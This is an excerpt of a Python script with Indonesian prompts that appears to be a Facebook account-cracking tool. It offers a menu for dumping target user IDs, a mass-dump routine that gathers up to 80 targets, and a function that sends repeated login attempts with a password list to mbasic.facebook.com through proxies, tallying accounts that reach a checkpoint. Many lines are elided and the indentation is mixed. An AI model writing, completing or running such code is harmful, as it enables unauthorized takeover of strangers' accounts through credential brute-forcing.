...
def menu(my_name,my_id):
	...
	if _____brayennn___xd____ in ['1','01']:
		...
		dumpid()
	elif _____brayennn___xd____ in ['instagram','Instagram']:
		loginCookie()
	...
	if len(vin)==0:
		...
		for isi in vin:
			...
			if cih<100:
				...
				print(f'\n %s. %s ({h} %s idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' [+] %s. %s ({h} %s idz) '%(cih,isi,len(hem)))
		geeh = input(' [+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
...
def dump_massal():
	...
	try:
		...
		jum = int(input(f' [+] {P}Mau Berapa Idz Target  : '))
	except ValueError:
		print(' [+] Wrong input ')
		exit()
	if jum<1 or jum>80:
	...
	for userr in uid:
		try:
			...
			exit()
	try:
		print(f' [+] {P}Total Idz Target Yang Terkumpul : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'')
		print(' [+] Unstable Signal ')
...
def bapi(idf,pwv):
	...
	for pw in pwv:
		try:
            ...
            'cache-control': 'max-age=0',
            'dpr': '2',
            'referer': 'https://mbasic.facebook.com/home.php?paipv=0&eav=AfaidqZcX_LPKhAj9PPI8wnLZ09R7BW24DfWUOdWxSSeDCswsPNQ6hKmkwuiD0qT7i4&wtsid=rdr_01yaUeco2c4KvpvJv&_rdr',
			...
			po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
